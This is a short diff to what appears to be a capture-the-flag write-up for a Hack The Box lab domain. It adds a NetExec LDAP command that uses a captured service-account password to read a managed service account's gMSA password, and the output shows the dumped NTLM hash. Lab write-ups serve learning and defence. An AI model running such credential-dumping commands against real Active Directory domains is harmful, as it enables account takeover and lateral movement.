@@ -942,6 +942,16 @@ This user can read the gMSA password of `gmsa_ca_prod$` account
 # Compromising `gmsa_ca_prod$`
 
 ```python
+nxc ldap dc01.fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' --gmsa
+LDAP        10.129.244.72   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.244.72   389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
+LDAP        10.129.244.72   389    DC01             [*] Getting GMSA Passwords
+LDAP        10.129.244.72   389    DC01             Account: gMSA_CA_prod$        NTLM: 1be70aa7a632cd28036169c6038a92a5     PrincipalsAllowedToReadPassword: svc_infra
+```
+
+Ill grab the NTLM
+
+```python
 
 ```
 
